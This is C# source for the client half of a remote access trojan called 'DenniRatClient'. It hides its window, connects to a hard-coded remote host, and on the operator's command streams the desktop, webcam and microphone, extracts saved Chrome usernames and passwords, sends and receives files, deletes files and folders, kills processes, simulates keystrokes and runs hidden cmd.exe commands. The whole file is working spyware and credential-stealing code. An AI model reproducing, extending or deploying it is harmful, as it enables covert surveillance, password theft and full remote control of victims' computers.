using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net.Sockets;
using System.Drawing.Imaging;
using System.Runtime.Serialization.Formatters.Binary;
using System.Net;
using System.IO;
using System.Drawing.Drawing2D;
using System.Diagnostics;
using NAudio.Wave;
using Newtonsoft.Json;
using System.Runtime.CompilerServices;
using AForge.Video.DirectShow;
using AForge.Video;
using System.Windows.Forms.VisualStyles;
using System.Threading;
using ChromePassDecrypter;

using System.Data.SQLite;

namespace DenniRatClient
{
    public partial class Form1 : Form
    {
        private readonly TcpClient client = new TcpClient();
        private NetworkStream mainStream;
        private int portNumber = 169; //port to connect to
        private string ipToConnectTo = "1.1.1.1"; //ip to connect to

        private string currentcommand = "";
        private bool allowshowdisplay = false;
        private bool currentlyBroadcastingWebcam = false;

        private bool currentlyBroadcastingMic = false;

        VideoCaptureDevice videoSource;

        private bool receivingfilenext = false;
        private string receiveflpath = "";

        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(allowshowdisplay ? value : allowshowdisplay);
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            try
            {
                client.Connect(ipToConnectTo, portNumber);
                connecttimer.Start();
                //MessageBox.Show("connected");
            }
            catch (Exception)
            {
                //MessageBox.Show("failed");
            }
        }

        private void connecttimer_Tick(object sender, EventArgs e)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            if (receivingfilenext)
            {
                mainStream = client.GetStream();
                try
                {
                    File.WriteAllBytes(receiveflpath, (byte[])binFormatter.Deserialize(mainStream));
                }
                catch
                {
                    Console.WriteLine("failed");
                }
                receivingfilenext = false;
                return;
            }

            currentcommand = ReceiveCommand();
            mainStream = client.GetStream();
            if (currentcommand.StartsWith("startconnection"))
            {
                binFormatter.Serialize(mainStream, System.Environment.MachineName + "=" + GetLocalIPAddress());
            }
            else if (currentcommand.StartsWith("showinfo"))
            {
                binFormatter.Serialize(mainStream, getSystemDetails());
            }
            else if (currentcommand.StartsWith("getimg"))
            {
                string[] opts = currentcommand.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries);
                int compressionamt = int.Parse(opts[1]);
                int xval = int.Parse(opts[2]);
                int yval = int.Parse(opts[3]);
                binFormatter.Serialize(mainStream, VaryQualityLevel(GrabSmallerDesktop(xval, yval), (long)compressionamt));
                //binFormatter.Serialize(mainStream, (Image)GrabDesktop());
            }
            else if (currentcommand.StartsWith("getchrpasses"))
            {
                string passes = GetChromePasses();
                binFormatter.Serialize(mainStream, passes);
            }
            else if (currentcommand.StartsWith("getpossiblecams"))
            {
                string possiblecams = "";
                FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                for(int i = 0; i < videoDevices.Count; i++)
                {
                    possiblecams = possiblecams + videoDevices[i].Name + "::" + videoDevices[i].MonikerString + ":::";
                }
                binFormatter.Serialize(mainStream, possiblecams);
            }
            else if (currentcommand.StartsWith("getcam"))
            {
                string devname = currentcommand.Substring(7);

                if (!currentlyBroadcastingWebcam)
                {
                    videoSource = new VideoCaptureDevice(devname);
                    videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                    videoSource.Start();
                    currentlyBroadcastingWebcam = true;
                }
                binFormatter.Serialize(mainStream, GrabCameraImg());
            }
            else if (currentcommand.StartsWith("clearcams"))
            {
                currentlyBroadcastingWebcam = false;
                videoSource.Stop();
                newFrame = null;
                binFormatter.Serialize(mainStream, "successful");
            }
            else if (currentcommand.StartsWith("getaudsources"))
            {
                binFormatter.Serialize(mainStream, getaudsources());
            }
            else if (currentcommand.StartsWith("startaudrecording"))
            {
                //Console.WriteLine(currentcommand.Substring(17));
                int devnum = int.Parse(currentcommand.Substring(17));

                if (!currentlyBroadcastingMic)
                {
                    recorder = new WaveIn();
                    recorder.DeviceNumber = devnum;
                    recorder.DataAvailable += new EventHandler<WaveInEventArgs>(RecorderOnDataAvailable);
                    recorder.WaveFormat = new WaveFormat(48000, 16, 1);

                    recorder.StartRecording();

                    currentlyBroadcastingMic = true;
                }
                if(getwavebytes().Length <= 0)
                {
                    binFormatter.Serialize(mainStream, "failed");
                }
                else
                {
                    binFormatter.Serialize(mainStream, getwavebytes());
                    recordedbyte = new byte[] { };
                }
            }
            else if (currentcommand.StartsWith("sendkey"))
            {
                string[] opts = currentcommand.Split(new string[] { "::" }, StringSplitOptions.RemoveEmptyEntries);
                
                KeyEventArgs ke = JsonConvert.DeserializeObject<KeyEventArgs>(opts[1]);

                bool endwithpar = false;
                bool endwithpartwo = false;
                string sendkeystr = "";
                string kycode = ke.KeyCode.ToString();

                bool shiftpressed = ke.Shift;
                bool altpressed = ke.Alt;
                bool controlpressed = ke.Control;

                bool skipextrakeystuff = false;

                if(ke.KeyCode == Keys.Shift || ke.KeyCode == Keys.ShiftKey || ke.KeyCode == Keys.LShiftKey || ke.KeyCode == Keys.LShiftKey || ke.KeyCode == Keys.Control || ke.KeyCode == Keys.ControlKey || ke.KeyCode == Keys.LControlKey || ke.KeyCode == Keys.RControlKey || ke.KeyCode == Keys.Alt || ke.KeyCode == Keys.Menu || ke.KeyCode == Keys.LMenu || ke.KeyCode == Keys.RMenu)
                {
                    binFormatter.Serialize(mainStream, "etkey");
                    return;
                }

                if(shiftpressed)
                {
                    sendkeystr = "+";
                }

                if (controlpressed)
                {
                    sendkeystr = "^";
                }

                if (altpressed)
                {
                    sendkeystr = "%";
                }

                if (shiftpressed && altpressed)
                {
                    endwithpar = true;
                    sendkeystr = "%(+";
                }

                if (altpressed && controlpressed)
                {
                    endwithpar = true;
                    sendkeystr = "%(^";

                }

                if (shiftpressed && controlpressed)
                {
                    endwithpar = true;
                    sendkeystr = "+(^";

                }

                if (shiftpressed && altpressed && controlpressed)
                {
                    endwithpar = true;
                    endwithpartwo = true;
                    sendkeystr = "+(^(%(";
                }

                if(kycode.ToLower() == "return")
                {
                    kycode = "{Enter}";
                    skipextrakeystuff = true;
                }

                if (kycode.ToLower() == "space")
                {
                    kycode = " ";
                    skipextrakeystuff = true;
                }

                if (!skipextrakeystuff)
                {
                    if (endwithpar)
                    {
                        sendkeystr = sendkeystr + kycode.ToLower() + ")";
                        if (endwithpartwo)
                        {
                            sendkeystr = sendkeystr + kycode.ToLower() + "))";
                        }
                    }
                    else
                    {
                        sendkeystr = sendkeystr + kycode.ToLower();
                    }
                }

                binFormatter.Serialize(mainStream, "yessir");
                SendKeys.Send(sendkeystr);
                SendKeys.Flush();
            }
            else if (currentcommand.StartsWith("flmanagerstart"))
            {
                binFormatter.Serialize(mainStream, setupFlManager());
            }
            else if (currentcommand.StartsWith("flmanagergoto"))
            {
                string pathd = currentcommand.Substring(15);
                binFormatter.Serialize(mainStream, GetStuffInPath(pathd));
            }
            else if (currentcommand.StartsWith("upfolder"))
            {
                string pathd = currentcommand.Substring(10);
                binFormatter.Serialize(mainStream, GoUpFolder(pathd));
            }
            else if (currentcommand.StartsWith("getcertainpath"))
            {
                string pathd = currentcommand.Substring(16);
                binFormatter.Serialize(mainStream, GetCertainPath(pathd));
            }
            else if (currentcommand.StartsWith("downloadfl"))
            {
                string pathd = currentcommand.Substring(12);
                binFormatter.Serialize(mainStream, SendFl(pathd));
            }
            else if (currentcommand.StartsWith("getflinfo"))
            {
                string pathd = currentcommand.Substring(11);
                binFormatter.Serialize(mainStream, GetFlInfo(pathd));
            }
            else if (currentcommand.StartsWith("preparetoreceivenext"))
            {
                receiveflpath = currentcommand.Substring(22);
                receivingfilenext = true;
                binFormatter.Serialize(mainStream, "ready");
            }
            else if (currentcommand.StartsWith("delfiles"))
            {
                string pathd = currentcommand.Substring(10);
                //Console.WriteLine(pathd);
                File.Delete(pathd);
                binFormatter.Serialize(mainStream, "successdel");
            }
            else if (currentcommand.StartsWith("delfolder"))
            {
                string pathd = currentcommand.Substring(11);
                //Console.WriteLine(pathd);
                Directory.Delete(pathd, true);
                binFormatter.Serialize(mainStream, "successdel");
            }
            else if (currentcommand.StartsWith("executefl"))
            {
                string pathd = currentcommand.Substring(11);

                binFormatter.Serialize(mainStream, "successexe");

                try
                {
                    Process.Start(pathd);
                }
                catch
                {
                    Console.WriteLine("failed");
                }
            }
            else if (currentcommand.StartsWith("getallfilesindirs"))
            {
                string pathd = currentcommand.Substring(19);
                binFormatter.Serialize(mainStream, GetSubFiles(pathd));
            }
            else if (currentcommand.StartsWith("getallfoldsindirs"))
            {
                string pathd = currentcommand.Substring(19);
                binFormatter.Serialize(mainStream, GetSubDirs(pathd));
            }
            else if (currentcommand.StartsWith("createfolder"))
            {
                string pathd = currentcommand.Substring(14);
                Directory.CreateDirectory(pathd);
                binFormatter.Serialize(mainStream, "success");
            }
            else if (currentcommand.StartsWith("getrunningprocs"))
            {
                Process[] proclist = Process.GetProcesses();
                string proclststr = "";

                foreach(Process p in proclist)
                {
                    proclststr = proclststr + p.ProcessName + "::" + p.Id + ":::";
                }

                binFormatter.Serialize(mainStream, proclststr);
            }
            else if (currentcommand.StartsWith("killproc"))
            {
                int procid = 0;
                try
                {
                    procid = int.Parse(currentcommand.Substring(10));
                    if (ProcessExists(procid))
                    {
                        Process proc = Process.GetProcessById(procid);
                        proc.Kill();
                        binFormatter.Serialize(mainStream, "success");
                    }
                }
                catch
                {
                    binFormatter.Serialize(mainStream, "failed");
                }
            }
            else if (currentcommand.StartsWith("toggletaskbar"))
            {
                bool taskbarhidden = bool.Parse(currentcommand.Substring(15));
                if (!taskbarhidden)
                {
                    Taskbar.Show();
                    binFormatter.Serialize(mainStream, "shown");
                }
                else
                {
                    Taskbar.Hide();
                    binFormatter.Serialize(mainStream, "hidden");
                }
            }
            else if (currentcommand.StartsWith("cmdsend"))
            {
                string commandcmd = currentcommand.Substring(9);
                Console.WriteLine(commandcmd);

                binFormatter.Serialize(mainStream, "success");

                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/c " + commandcmd;
                process.StartInfo = startInfo;
                process.Start();

                if (commandcmd.StartsWith("shutdown"))
                {
                    Thread t = new Thread(cancelShutdown);
                    t.Start();
                }
            }
            else if (currentcommand.StartsWith("showmessagebox"))
            {
                string[] messparams = currentcommand.Split(new string[] { "::" }, StringSplitOptions.None);
                string title = messparams[1];
                string text = messparams[2];
                string buttontype = messparams[3];

                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";

                string addedstuff = "";

                if (MessageBoxButtons.YesNo.ToString() == buttontype)
                {
                    //MessageBox.Show(text, title, MessageBoxButtons.YesNo);
                    addedstuff = "powershell Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show(\'" + text + "\',\'" + title + "\',\'YesNo\',\'None\');";
                    startInfo.Arguments = "/c " + addedstuff;
                }

                if (MessageBoxButtons.YesNoCancel.ToString() == buttontype)
                {
                    //MessageBox.Show(text, title, MessageBoxButtons.YesNoCancel);
                    addedstuff = "powershell Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show(\'" + text + "\',\'" + title + "\',\'YesNoCancel\',\'None\');";
                    startInfo.Arguments = "/c " + addedstuff;
                }

                if (MessageBoxButtons.OK.ToString() == buttontype)
                {
                    //MessageBox.Show(text, title, MessageBoxButtons.OK);
                    addedstuff = "powershell Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show(\'" + text + "\',\'" + title + "\',\'OK\',\'None\');";
                    startInfo.Arguments = "/c " + addedstuff;
                }

                if (MessageBoxButtons.OKCancel.ToString() == buttontype)
                {
                    //MessageBox.Show(text, title, MessageBoxButtons.OKCancel);
                    addedstuff = "powershell Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show(\'" + text + "\',\'" + title + "\',\'OKCancel\',\'None\');";
                    startInfo.Arguments = "/c " + addedstuff;
                }

                process.StartInfo = startInfo;
                process.Start();

                binFormatter.Serialize(mainStream, "success");
            }
            else if (currentcommand.StartsWith("rotatescreen"))
            {
                string rotamt = currentcommand.Substring(14);

                if(rotamt == "0")
                {
                    Display.Rotate(1, Display.Orientations.DEGREES_CW_0);
                }

                if (rotamt == "90")
                {
                    Display.Rotate(1, Display.Orientations.DEGREES_CW_90);
                }

                if (rotamt == "180")
                {
                    Display.Rotate(1, Display.Orientations.DEGREES_CW_180);
                }

                if (rotamt == "270")
                {
                    Display.Rotate(1, Display.Orientations.DEGREES_CW_270);
                }

                binFormatter.Serialize(mainStream, "success");
            }
            else if (currentcommand.StartsWith("notepadmessage"))
            {
                string[] messparams = currentcommand.Split(new string[] { "::" }, StringSplitOptions.None);

                NotepadHelper.ShowMessage(messparams[1], messparams[2]);

                binFormatter.Serialize(mainStream, "success");
            }
        }

        private void cancelShutdown()
        {
            Console.WriteLine("restart");
            Thread.Sleep(5000);

            Process.Start("shutdown", "/a");
        }

        private string ReceiveCommand()
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            mainStream = client.GetStream();
            try
            {
                return (string)binFormatter.Deserialize(mainStream);
            }
            catch
            {
                return "failedcatch";
            }
        }

        private void SendCommand(string command)
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            mainStream = client.GetStream();
            binFormatter.Serialize(mainStream, command);
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "notfound";
        }

        private bool ProcessExists(int id)
        {
            return Process.GetProcesses().Any(x => x.Id == id);
        }

        #region flmanager

        private string[] GetSubFiles(string ogpath)
        {
            string[] allfiles = Directory.GetFiles(ogpath, "*", SearchOption.AllDirectories);
            return allfiles;
        }
        private string[] GetSubDirs(string ogpath)
        {
            string[] alldirs = Directory.GetDirectories(ogpath, "*", SearchOption.AllDirectories);
            return alldirs;
        }

        private string GetFlInfo(string pathd)
        {
            FileInfo fl = new FileInfo(pathd);
            long length = new System.IO.FileInfo(pathd).Length;
            Decimal fileSizeInMB = Convert.ToDecimal(length) / (1024.0m * 1024.0m);
            Decimal fileSizeInKB = 0.0m;

            string flsize = "";

            if (Math.Round(fileSizeInMB, 2) < 10.0m)
            {
                fileSizeInKB = Convert.ToDecimal(length) / (1024.0m);
                flsize = (Math.Round(fileSizeInKB, 2)).ToString() + " Kb";
            }
            else
            {
                flsize = (Math.Round(fileSizeInMB, 2)).ToString() + " Mb";
            }


            bool isReadOnly = ((File.GetAttributes(pathd) & FileAttributes.ReadOnly) == FileAttributes.ReadOnly);
            bool isHidden = ((File.GetAttributes(pathd) & FileAttributes.Hidden) == FileAttributes.Hidden);

            DateTime lastModified = System.IO.File.GetLastWriteTime(pathd);

            //string flsize = (Math.Round(fileSizeInMB, 2)).ToString() + " Mb";
            string fltype = "Type: " + Path.GetExtension(pathd);
            string flattributes = "Attributes: ReadOnly=" + isReadOnly.ToString() + " Hidden=" + isHidden.ToString();
            string fllastmodified = "Last Modified: " + lastModified.ToString("MM/dd/yy HH:mm:ss");

            return (flsize + " | " + fltype + " | " + flattributes + " | " + fllastmodified);
        }

        private byte[] SendFl(string pathd)
        {
            
            long length = new System.IO.FileInfo(pathd).Length;
            Decimal fileSizeInMB = Convert.ToDecimal(length) / (1024.0m * 1024.0m);

            if (fileSizeInMB > 100.0m)
            {
                return Encoding.ASCII.GetBytes("failure");
            }

            return System.IO.File.ReadAllBytes(pathd);
        }

        private string GetCertainPath(string cpath)
        {
            if(cpath == "desktop")
            {
                return Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            }
            else if(cpath == "documents")
            {
                return Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            }
            else if (cpath == "downloads")
            {
                return KnownFolders.GetPath(KnownFolder.Downloads);
            }
            else if (cpath == "music")
            {
                return Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
            }
            else if (cpath == "pictures")
            {
                return Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
            }
            else if (cpath == "videos")
            {
                return Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
            }

            return "base";
        }

        private string GoUpFolder(string path)
        {
            DirectoryInfo d = new DirectoryInfo(path);
            DirectoryInfo par = d.Parent;

            if(par == null)
            {
                return "base";
            }
            else
            {
                return par.FullName;
            }
        }

        private string GetStuffInPath(string path)
        {

            DirectoryInfo d = new DirectoryInfo(path);

            DirectoryInfo[] directories = d.GetDirectories();
            string dirjson = JsonConvert.SerializeObject(directories);

            FileInfo[] files = d.GetFiles();
            string fljson = JsonConvert.SerializeObject(files);

            return (dirjson + ":::separa:::" + fljson);

        }

        private string setupFlManager()
        {
            List<DirectoryInfo> drivedirs = new List<DirectoryInfo>();

            foreach (var drive in DriveInfo.GetDrives())
            {
                drivedirs.Add(drive.RootDirectory);
            }

            return JsonConvert.SerializeObject(drivedirs.ToArray());
        }

        #endregion


        #region getaudio

        private WaveIn recorder;
        private byte[] recordedbyte = new byte[] { };

        private string getaudsources()
        {
            string retstring = "";

            int waveInDevices = WaveIn.DeviceCount;
            for (int waveInDevice = 0; waveInDevice < waveInDevices; waveInDevice++)
            {
                WaveInCapabilities deviceInfo = WaveIn.GetCapabilities(waveInDevice);
                retstring = retstring + (deviceInfo.ProductName + "::" + deviceInfo.Channels + "::" + waveInDevice.ToString() + ":::");
            }

            return retstring;
        }
        private void RecorderOnDataAvailable(object sender, WaveInEventArgs waveInEventArgs)
        {
            recordedbyte = Combine(recordedbyte, waveInEventArgs.Buffer);
        }

        public static byte[] Combine(byte[] first, byte[] second)
        {
            byte[] bytes = new byte[first.Length + second.Length];
            Buffer.BlockCopy(first, 0, bytes, 0, first.Length);
            Buffer.BlockCopy(second, 0, bytes, first.Length, second.Length);
            return bytes;
        }

        private byte[] getwavebytes()
        {
            return recordedbyte;
        }

        #endregion


        #region grabcamimg

        private Bitmap newFrame = null;

        private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            // get new frame
            newFrame = (Bitmap)eventArgs.Frame.Clone();
            // process the frame
        }

        public static byte[] ObjectToByteArray(Object obj)
        {
            BinaryFormatter bf = new BinaryFormatter();
            using (var ms = new MemoryStream())
            {
                bf.Serialize(ms, obj);
                return ms.ToArray();
            }
        }

        private Image GrabCameraImg()
        {
            if (newFrame == null)
            {
                return Properties.Resources.nocam;
            }
            else
            {
                return newFrame;
            }
        }

        #endregion


        #region getchrpasses

        private string GetChromePasses()
        {
            ChromeCredential[] ccarr = ChromePasswords.GetPasswords();
            string retstr = "";
            foreach(ChromeCredential cc in ccarr)
            {
                retstr = retstr + cc.Url + ":::" + cc.Username + ":::" + cc.Password + "::::";
            }
            return retstr;
        }

        /*
        private string GetChromePassesLate()
        {
            string chromerpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "chromer.exe");

            FileInfo fi = new FileInfo("chromer.exe");
            fi.CopyTo(chromerpath, true);

            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine("\"" + chromerpath + "\"");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            return cmd.StandardOutput.ReadToEnd();
        }*/

        #endregion


        #region desktopstream

        private Bitmap GrabDesktop()
        {
            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                         Screen.PrimaryScreen.Bounds.Height);
            //Create the Graphic Variable with screen Dimensions
            Graphics graphics = Graphics.FromImage(printscreen as Image);
            //Copy Image from the screen
            graphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
            return printscreen;
        }

        private Bitmap GrabSmallerDesktop(int smx, int smy)
        {
            Bitmap image = GrabDesktop();
            image = new Bitmap(resizeImage(image, new System.Drawing.Size(smx, smy)));
            return image;
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {

            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();

            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        private Image VaryQualityLevel(Bitmap b, long envpa)
        {
            // Get a bitmap.
            Bitmap bmp1 = b;
            ImageCodecInfo jgpEncoder = GetEncoder(ImageFormat.Jpeg);

            // Create an Encoder object based on the GUID
            // for the Quality parameter category.
            System.Drawing.Imaging.Encoder myEncoder =
                System.Drawing.Imaging.Encoder.Quality;

            // Create an EncoderParameters object.
            // An EncoderParameters object has an array of EncoderParameter
            // objects. In this case, there is only one
            // EncoderParameter object in the array.
            EncoderParameters myEncoderParameters = new EncoderParameters(1);

            EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, envpa);
            myEncoderParameters.Param[0] = myEncoderParameter;
            MemoryStream ms = new MemoryStream();
            bmp1.Save(ms, jgpEncoder, myEncoderParameters);
            return Image.FromStream(ms);

        }

        static Image resizeImage(Image imgToResize, System.Drawing.Size size)
        {
            int sourceWidth = imgToResize.Width;
            int sourceHeight = imgToResize.Height;

            float nPercent = 0;
            float nPercentW = 0;
            float nPercentH = 0;

            nPercentW = ((float)size.Width / (float)sourceWidth);
            nPercentH = ((float)size.Height / (float)sourceHeight);

            if (nPercentH < nPercentW)
                nPercent = nPercentH;
            else
                nPercent = nPercentW;

            int destWidth = (int)(sourceWidth * nPercent);
            int destHeight = (int)(sourceHeight * nPercent);

            Bitmap b = new Bitmap(destWidth, destHeight, System.Drawing.Imaging.PixelFormat.Format24bppRgb);
            b.SetResolution(300, 300);
            Graphics g = Graphics.FromImage((Image)b);
            g.InterpolationMode = InterpolationMode.HighQualityBicubic;
            g.CompositingQuality = CompositingQuality.HighSpeed;
            g.SmoothingMode = SmoothingMode.HighSpeed;

            g.DrawImage(imgToResize, 0, 0, destWidth, destHeight);
            g.Dispose();

            return (Image)b;

        }

        #endregion


        #region sysinfogetter
        public string getSystemDetails()
        {
            string UserName = "";
            string LabelOS = "";
            string MachineTxt = "";
            string label8 = "";

            UserName = Environment.UserName; // User name of PC
            LabelOS = getOSInfo(); // OS version of pc
            MachineTxt = Environment.MachineName;// Machine name
            string OStype = "";
            if (Environment.Is64BitOperatingSystem) { OStype = "64-Bit, "; } else { OStype = "32-Bit, "; }
            OStype += Environment.ProcessorCount.ToString() + " Processor";
            label8 = OStype; // Processor type

            return UserName + "=" + LabelOS + "=" + MachineTxt + "=" + label8;
        }

        public string getOSInfo()
        {
            //Get Operating system information.
            OperatingSystem os = Environment.OSVersion;
            //Get version information about the os.
            Version vs = os.Version;

            //Variable to hold our return value
            string operatingSystem = "";

            if (os.Platform == PlatformID.Win32Windows)
            {
                //This is a pre-NT version of Windows
                switch (vs.Minor)
                {
                    case 0:
                        operatingSystem = "95";
                        break;
                    case 10:
                        if (vs.Revision.ToString() == "2222A")
                            operatingSystem = "98SE";
                        else
                            operatingSystem = "98";
                        break;
                    case 90:
                        operatingSystem = "Me";
                        break;
                    default:
                        break;
                }
            }
            else if (os.Platform == PlatformID.Win32NT)
            {
                switch (vs.Major)
                {
                    case 3:
                        operatingSystem = "NT 3.51";
                        break;
                    case 4:
                        operatingSystem = "NT 4.0";
                        break;
                    case 5:
                        if (vs.Minor == 0)
                            operatingSystem = "Windows 2000";
                        else
                            operatingSystem = "Windows XP";
                        break;
                    case 6:
                        if (vs.Minor == 0)
                            operatingSystem = "Windows Vista";
                        else
                            operatingSystem = "Windows 7 or Above";
                        break;
                    default:
                        break;
                }
            }

            return operatingSystem;
        }
        #endregion
    }
}
